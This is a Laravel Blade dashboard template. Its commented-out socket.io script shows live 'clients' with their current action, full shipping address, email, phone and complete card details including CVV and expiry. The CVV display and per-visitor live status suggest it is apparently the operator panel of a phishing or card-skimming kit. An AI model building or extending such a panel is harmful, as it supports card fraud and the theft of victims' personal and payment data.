@extends('dashboard.layouts.app')

@section('content')
    <div id="dashboard-list" url="{{ $socket_url }}" newVisitor="{{ $newVisitor }}" sitePath="{{ $sitePath }}"></div>
@endsection

<!-- <div class="flex justify-end mb-4">
        <button type="button"
            class="btn bg-primary border border-primary rounded-md text-white transition-all duration-300 hover:bg-primary/[0.85] hover:border-primary/[0.85]"
            id="refreshDashboard">
            Refresh
        </button>
    </div>
    <div id="dashboard">
    </div> -->
@section('extrajs')
    <script>
        // $(document).ready(function() {
        //     let socket = io("http://{{ env('SOCKET_HOST') }}:{{ env('SOCKET_PORT') }}");
        //     socket.on('refreshClients', (data) => {
        //         const {
        //             clients
        //         } = data;
        //         let html = "";
        //         clients.reverse();
        //         clients.forEach((client) => {
        //             html += `
    //                 <div class='bg-white dark:bg-dark dark:border-gray/20 border-2 border-lightgray/10 p-5 rounded-lg mb-4 flex gap-4'>
    //                     <div><span class='text-lg'>ID:</span> <span class='text-md'>${client.id}</span></div>
    //                     <div><span class='text-lg'>Current Status:</span> <span class='text-md'>${client.action}</span></div>
    //                 `
        //             if(client.address) {
        //                 html += `
    //                 <div>
    //                     <div><span class='text-lg'>Shipping address</span></div>
    //                     <div><span class='text-md'>Name:</span> <span class='text-sm'>${client.address.name}</span></div>
    //                     <div><span class='text-md'>Address:</span> <span class='text-sm'>${client.address.address}</span></div>
    //                     <div><span class='text-md'>Straight:</span> <span class='text-sm'>${client.address.straight}</span></div>
    //                     <div><span class='text-md'>City:</span> <span class='text-sm'>${client.address.city}</span></div>
    //                     <div><span class='text-md'>State:</span> <span class='text-sm'>${client.address.state}</span></div>
    //                     <div><span class='text-md'>Country:</span> <span class='text-sm'>${client.address.country}</span></div>
    //                     <div><span class='text-md'>ZipCode:</span> <span class='text-sm'>${client.address.zipcode}</span></div>
    //                     <div><span class='text-md'>Email:</span> <span class='text-sm'>${client.address.email}</span></div>
    //                     <div><span class='text-md'>Phone:</span> <span class='text-sm'>${client.address.phone}</span></div>
    //                 </div>
    //                 `
        //             } else {
        //                 html += `<div>
    //                         <div><span class='text-lg'>Shipping address</span></div>
    //                     </div>`
        //             }
        //             if(client.payment) {
        //                 html += `
    //                 <div>
    //                     <div><span class='text-lg'>Payment</span></div>
    //                     <div><span class='text-md'>Card Number:</span> <span class='text-sm'>${client.payment.cardNumber}</span></div>
    //                     <div><span class='text-md'>CVV:</span> <span class='text-sm'>${client.payment.cvv}</span></div>
    //                     <div><span class='text-md'>Year:</span> <span class='text-sm'>${client.payment.year}</span></div>
    //                     <div><span class='text-md'>Month:</span> <span class='text-sm'>${client.payment.month}</span></div>
    //                     <div><span class='text-md'>Recipient:</span> <span class='text-sm'>${client.payment.recipient}</span></div>
    //                 </div>
    //                 `
        //             } else {
        //                 html += `<div>
    //                         <div><span class='text-lg'>Payment</span></div>
    //                     </div>`
        //             }
        //             html += '</div>'
        //         });
        //         $("#dashboard").html(html);
        //     });

        //     socket.on('connect', () => {
        //         socket.emit('refresh');
        //     });

        //     $('#refreshDashboard').click(() => {
        //         $("#dashboard").html("");
        //         socket.emit('refresh');
        //     })
        // })
    </script>
@endsection
